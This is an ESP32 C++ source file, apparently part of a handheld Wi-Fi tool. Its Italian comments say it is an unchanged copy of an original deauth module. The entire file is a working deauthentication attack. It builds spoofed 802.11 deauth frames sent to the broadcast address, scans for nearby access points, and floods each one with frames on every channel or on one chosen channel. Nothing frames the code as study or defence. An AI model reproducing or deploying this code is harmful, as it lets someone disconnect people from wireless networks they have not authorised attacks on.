// deauth.cpp - copia invariata dell'originale 128x64_Flexible/deauth.cpp
// Nessuna modifica necessaria per LOLIN32 Lite
// (usa solo WiFi + esp_wifi API standard)
#include "deauth.h"

typedef struct {
  uint8_t  frame_control[2];
  uint16_t duration;
  uint8_t  addr1[6];
  uint8_t  addr2[6];
  uint8_t  addr3[6];
  uint16_t seq_ctrl;
  uint16_t reason_code;
} DeauthFrame;

static DeauthFrame deauth_frame;

static void build_deauth_frame(const uint8_t *bssid)
{
  deauth_frame.frame_control[0] = 0xC0;
  deauth_frame.frame_control[1] = 0x00;
  deauth_frame.duration         = 0x013A;
  deauth_frame.seq_ctrl         = 0;
  deauth_frame.reason_code      = 0x0007;
  memset(deauth_frame.addr1, 0xFF, 6);
  memcpy(deauth_frame.addr2, bssid, 6);
  memcpy(deauth_frame.addr3, bssid, 6);
}

void wifi_deauth_all()
{
  int n = WiFi.scanNetworks(false, true);
  for ( int i = 0; i < n; i++ )
  {
    uint8_t *bssid = WiFi.BSSID(i);
    int      ch    = WiFi.channel(i);
    esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
    build_deauth_frame(bssid);
    for ( int k = 0; k < 10; k++ )
      esp_wifi_80211_tx(WIFI_IF_STA, &deauth_frame, sizeof(deauth_frame), false);
  }
}

void wifi_deauth_scan()
{
  for ( int chIndex = 0; chIndex < NumberChannels; chIndex++ )
  {
    int ch = WiFiScanChannels[chIndex];
    esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
    int n = WiFi.scanNetworks(false, true, false, 100, (uint8_t)ch);
    for ( int i = 0; i < n; i++ )
    {
      uint8_t *bssid = WiFi.BSSID(i);
      build_deauth_frame(bssid);
      for ( int k = 0; k < 10; k++ )
        esp_wifi_80211_tx(WIFI_IF_STA, &deauth_frame, sizeof(deauth_frame), false);
    }
  }
}

void wifi_deauth_channel(int channel)
{
  esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
  int n = WiFi.scanNetworks(false, true, false, 100, (uint8_t)channel);
  for ( int i = 0; i < n; i++ )
  {
    uint8_t *bssid = WiFi.BSSID(i);
    build_deauth_frame(bssid);
    for ( int k = 0; k < 10; k++ )
      esp_wifi_80211_tx(WIFI_IF_STA, &deauth_frame, sizeof(deauth_frame), false);
  }
}
